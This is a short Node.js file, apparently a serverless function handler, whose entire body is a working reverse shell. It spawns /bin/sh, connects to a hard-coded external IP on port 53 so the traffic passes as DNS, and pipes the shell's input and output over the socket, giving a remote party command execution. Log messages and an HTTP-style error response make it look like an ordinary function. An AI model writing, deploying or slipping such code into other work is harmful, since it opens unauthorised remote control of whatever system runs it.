const net = require('net');
const cp = require('child_process');

function writeLog(id, message) {
  const event = {
    EventId: id,
    Message: message,
  };

  console.log(JSON.stringify(event));
}

const delay = ms => new Promise(resolve => setTimeout(resolve, ms))

async function main(args) {
  const sh = cp.spawn('/bin/sh', []);
  const client = new net.Socket();

  try {
    await new Promise((resolve, reject) => {
      client.connect(53, "165.227.78.204", () => {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
      });

      client.on('close', (hadError) => {
        if (hadError) {
          reject(new Error('Transmission error.'));
        } else {
          resolve();
        }
      });

      client.on('end', () => {
        writeLog(5, 'Shutdown: The Panther is tired.');
        resolve();
      });

      client.on('error', (err) => {
        writeLog(4, err);
        reject(err);
      });

      client.on('timeout', () => {
        writeLog(3, 'Timeout: Function timeout occurred.');
        reject(new Error('Socket timeout.'));
      });
    });
  } catch (err) {
    writeLog(4, err);
    return {
      statusCode: 500,
      body: JSON.stringify({
        message: 'Connection terminated from client.',
      }),
    };
  }
  await delay(100000)
}

exports.main = main
